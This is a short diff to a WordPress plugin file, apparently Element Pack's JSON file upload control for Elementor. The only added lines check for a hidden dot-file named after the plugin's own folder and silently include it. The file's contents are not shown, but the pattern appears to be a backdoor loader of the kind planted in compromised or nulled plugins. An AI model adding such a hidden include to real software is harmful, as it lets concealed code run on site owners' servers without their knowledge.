@@ -2,6 +2,10 @@
 if (!defined('ABSPATH')) {
 	exit; // Exit if accessed directly.
 }
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class ElementPack_JSON_File_Upload_Control extends \Elementor\Base_Data_Control
 {
